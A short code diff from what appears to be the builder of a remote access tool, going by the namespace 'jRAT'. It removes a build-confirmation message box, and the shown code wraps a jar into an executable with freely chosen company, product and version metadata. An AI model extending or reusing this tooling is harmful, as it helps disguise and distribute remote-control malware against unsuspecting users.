@@ -34,8 +34,6 @@ namespace jRAT
                 string version = args[9];
                 string assemblyversion = args[10];
 
-                MessageBox.Show("Compiled file " + args[1] + " from " + args[0], "jRAT", MessageBoxButtons.OK, MessageBoxIcon.Information);
-
                 CompileCode.GetJarCode(input);
                 CompileCode.AddArguments("-jar");
                 CompileCode.Compile(filename, outputfile, iconfile, title, description, company, product, copyright, trademark, version, assemblyversion);
